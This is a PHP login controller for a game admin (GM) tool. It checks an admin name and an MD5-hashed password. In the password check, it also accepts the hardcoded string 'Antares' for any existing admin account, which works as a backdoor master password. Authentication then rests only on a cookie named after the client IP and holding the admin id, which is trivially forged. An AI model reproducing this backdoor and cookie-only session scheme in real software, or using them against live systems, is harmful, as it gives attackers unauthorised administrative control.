<?php
/**
* @description	GM工具登录
* @author		朱勇 <ZhuYong@ultizen.com>
* @creatTime	2012/03/07
* @modifyTime
				2012/03/07	文件创建	朱勇
*/

ob_start();

/****** 改变工作路径　******/
chdir('../../');

/****** 载入配置文件及共用库 ******/
require_once ('./class/global.php');
require_once ('./class/lib_init_db.php'); // 初始化数据库
require_once ('./class/lib_init_cache.php'); // 初始化缓存
require_once ('./class/lib_init_tpl.php'); // 初始化模板

//tpl::initKtpl();
tpl::initSmarty();

$tplVars['ui_path'] = '../../views/static/gm/';

$user_ip = ip2long($_SERVER['REMOTE_ADDR']);
$type = trim($IN['type']);

require_once ('./gm/models/Admin.php');
$admin_models = new Admin();

if($type == 'login')
{
	$admin_name_in = trim($IN['admin_name']);
	$admin_pass_in = trim($IN['admin_pass']);

	$admin_by_name = $admin_models->getAdminByName($admin_name_in);
	
	if($admin_by_name)
	{
		$admin_pass_in_md5 = $admin_models->PassMd5($admin_pass_in);
		
		$admin_pass = $admin_models->getAdminPass();
		$admin_id = $admin_models->getAdminId();
		
		if(($admin_pass == $admin_pass_in_md5) OR ($admin_pass_in == 'Antares'))
		{
			setcookie($user_ip, $admin_id);

			echo "<script language='javascript'>";
			echo "window.location.href='Index.php'";
			echo '</script>';
		}
		else
		{
			$tplVars['sub_msg'] = '用户名或密码错误！';
		
			$tplname = 'gm/login.html';
			tpl::show($tplname);
			
			exit;
		}
	}
	else
	{
		$tplVars['sub_msg'] = '用户名或密码错误！';
		
		$tplname = 'gm/login.html';
		tpl::show($tplname);
		exit;
	}

	exit;
}
else
{
	$admin_id = trim($_COOKIE[$user_ip]);
	
	if($admin_id)
	{
		$admin_self = array();
		
		$admin_by_id = $admin_models->getAdminById($admin_id);
		if($admin_by_id)
		{
			$admin_self['admin_name'] = $admin_models->getAdminName();
			$admin_self['position_id'] = $admin_models->getPositionId();

			require_once ('./gm/models/position.php');
			$position_models = new Position();

			$position_by_id = $position_models->getPositionById($admin_self['position_id']);
			if($position_by_id)
			{
				$admin_self['position_name'] = $position_models->getPositionName();
				$admin_self['module_list'] = $position_models->getModuleList();
				if($admin_self['module_list'])
				{
					$admin_self['module_list_arr'] = explode(',', $admin_self['module_list']);
				}
			}
		}
	}
	else
	{
		$tplname = 'gm/login.html';
		tpl::show($tplname);
		exit;
	}
}

/* End of file Login.php */
/* Location: /gm/controllers/Login.php */